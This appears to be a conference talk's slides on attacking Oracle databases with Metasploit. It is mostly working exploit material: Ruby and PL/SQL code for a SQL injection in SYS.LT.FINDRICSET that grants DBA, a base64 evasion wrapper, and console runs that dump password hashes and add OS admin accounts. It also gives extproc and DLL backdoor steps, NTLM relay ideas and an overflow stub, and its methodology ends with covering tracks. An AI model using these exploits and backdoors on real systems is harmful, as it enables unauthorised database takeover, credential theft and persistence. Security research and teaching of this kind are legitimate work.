# Oracle Database Privilege Escalation and Post-Exploitation

## References
- BID: 26098
- Disclosure Date: October 17, 2007

## Configuration
```ruby
register_options([
  OptString.new('SQL', [false, 'SQL to execute.', "GRANT DBA to #{datastore['DBUSER']}"])
], self.class)
```

## Privilege Escalation
### Code Execution
```ruby
name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

function = <<~FUNCTION
  CREATE OR REPLACE FUNCTION #{name} RETURN NUMBER
  AUTHID CURRENT_USER AS
  PRAGMA AUTONOMOUS_TRANSACTION;
  BEGIN
    EXECUTE IMMEDIATE '#{datastore['SQL'].upcase}';
    COMMIT;
    RETURN(0);
  END;
FUNCTION

package = <<~PACKAGE
  BEGIN 
  SYS.LT.FINDRICSET('.'' #{datastore['DBUSER']}.#{name}||'''')--',''); 
  END;
PACKAGE

clean = "DROP FUNCTION #{name}"
```

### Execution
```ruby
print_status("Sending first function...")
prepare_exec(function)
print_status("Attempting SQL injection on SYS.LT.FINDRICSET...")
prepare_exec(package)
print_status("Removing function '#{name}'...")
prepare_exec(clean)
```

### Setup
```bash
msf auxiliary(lt_findricset) > set RHOST 172.10.1.109
RHOST => 172.10.1.109
msf auxiliary(lt_findricset) > set RPORT 1521
RPORT => 1521
msf auxiliary(lt_findricset) > set DBUSER SCOTT
DBUSER => SCOTT
msf auxiliary(lt_findricset) > set DBPASS TIGER
DBPASS => TIGER
msf auxiliary(lt_findricset) > set SID ORCL
SID => ORCL
msf auxiliary(lt_findricset) > set SQL GRANT DBA TO SCOTT
SQL => GRANT DBA TO SCOTT
```

### Attack
```bash
msf auxiliary(lt_findricset) > set SQL "grant dba to scott"
SQL => grant dba to scott
msf auxiliary(lt_findricset) > run
[*] Sending first function...
[*] Done...
[*] Attempting SQL injection on SYS.LT.FINDRICSET...
[*] Done...
[*] Removing function 'NBVFICZ'...
[*] Done...
[*] Auxiliary module execution completed
```

### Verification
```sql
-- Before Injection
SQL => select * from user_role_privs
msf auxiliary(sql) > run
[*] Sending SQL... 
[*] SCOTT,CONNECT,NO,YES,NO 
[*] SCOTT,RESOURCE,NO,YES,NO 

-- After Injection
msf auxiliary(sql) > run 
[*] Sending SQL... 
[*] SCOTT,CONNECT,NO,YES,NO 
[*] SCOTT,DBA,NO,YES,NO
[*] SCOTT,RESOURCE,NO,YES,NO 
```

### Evasion
```sql
DECLARE
  #{rand2} VARCHAR2(32767);
BEGIN
  #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
  EXECUTE IMMEDIATE #{rand2}; 
END;

dos = Rex::Text.encode_base64(package)
```

### Exploit Coverage
- `lt_findricset.rb`
- `lt_findricset_cursor.rb`
- `dbms_metadata_open.rb`
- `dbms_cdc_ipublish.rb`
- `dbms_cdc_publish.rb`
- `lt_compressworkspace.rb`
- `lt_mergeworkspace.rb`
- `lt_removeworkspace.rb`
- `lt_rollbackworkspace.rb`

## Oracle Attack Methodology
1. Locate a system running Oracle.
2. Determine Oracle Version.
3. Determine Oracle SID.
4. Guess/Bruteforce USER/PASS.
5. Privilege Escalation via SQL Injection.
6. Manipulate Data/Post Exploitation.
7. Cover Tracks.

## Post-Exploitation
### Data Extraction
```bash
msf auxiliary(sql) > set SQL "select username,password,account_status from dba_users"
SQL => select username,password,account_status from dba_users
msf auxiliary(sql) > run
[*] Sending SQL...
[*] SYS,7087B7E95718C0CC,OPEN
[*] SYSTEM,66DC0F914CDD83F3,OPEN
[*] DBSNMP,E066D214D5421CCC,OPEN
[*] SCOTT,F894844C34402B67,OPEN
[*] Done...
[*] Auxiliary module execution completed
```

### Command Execution
#### Win32Exec
```bash
msf auxiliary(win32exec) > set CMD "net user dba P@ssW0rd1234 /add"
CMD => net user dba P@ssW0rd1234 /add
msf auxiliary(win32exec) > run
[*] Creating MSF JAVA class...
[*] Done...
[*] Creating MSF procedure...
[*] Done...
[*] Sending command: 'net user dba P@ssW0rd1234 /add'
[*] Done...
[*] Auxiliary module execution completed
```

#### FTP Upload
```sql
-- Use UTL_FILE to echo over FTP batch script
-- Use DBMS_Scheduler to run the script and execute the malware
-- Demo Video: http://vimeo.com/2704188
```

#### Perl Backdoor
```sql
-- Oracle installs perl with every install
-- Use UTL_FILE to echo over perl shell line by line
-- Use one of the other tools to execute perl shell
-- Easy to use with *nix
```

#### Extproc Backdoor via Directory Traversal
```bash
msf auxiliary(extproc_backdoor_traversal) > set CMD "net user metasploit metasploit /add"
CMD => net user metasploit metasploit /add
msf auxiliary(extproc_backdoor_traversal) > run
[*] Setting up extra required permissions
[*] Done...
[*] Set msvcrt.dll location to C:\oracle\ora92\bin\../../../Windows\system32\msvcrt.dll
[*] Done...
[*] Setting extproc backdoor
[*] Running command net user metasploit metasploit /add
[*] Doneâ€¦
[*] Auxiliary module execution complete
```

#### Extproc Backdoor via Copy DLL
```sql
CREATE OR REPLACE DIRECTORY copy_dll_from AS 'C:\Windows\system32'; 
CREATE OR REPLACE DIRECTORY copy_dll_to AS 'C:\Oracle\product\10.1.0\db_1\BIN'; 
...
CREATE OR REPLACE LIBRARY extproc_shell AS 'C:\Oracle\product\10.1.0\db_1\bin\msvcrt.dll';
-- Works on newer Oracle 10g/11g
-- Reference: http://milw0rm.org/exploits/7675
```

### Oracle NTLM Stealer
- Oracle running as admin user, not SYSTEM.
- Have Oracle connect back to Metasploit, grab halfLM challenge or perform SMB Relay attack.
- Module documentation: http://www.dsecrg.com/files/pub/pdf/Penetration_from_application_down_to_OS_(Oracle%20database).pdf

### Scanning for Vulnerable URLs
```bash
msf auxiliary(oas_cgi) > run
[*] /em/console/logon/logon
[*] /em/dynamicImage/emSDK/chart/EmChartBean
[*] /servlet/DMSDump
[*] /servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
[*] /servlet/Spy
[*] Auxiliary module execution completed
```

## The Way Ahead
- Exploits for vulnerable packages.
- Example: ORA-03135: connection lost contact
  ```sql
  sploit = rand_text_alpha_upper(576) + "BBBB" + "AAAA" + "\xcc" * 500
  sql = %Q|BEGIN
  SYS.DBMS_SNAP_INTERNAL.DELETE_REFRESH_OPERATIONS('MSF', '#{sploit}');
  END;|
  ```

## Acknowledgements
- HDM, Richard Evans, JMG, !LSO, Sh2kerr, Rory McCune

Thank you! Any questions?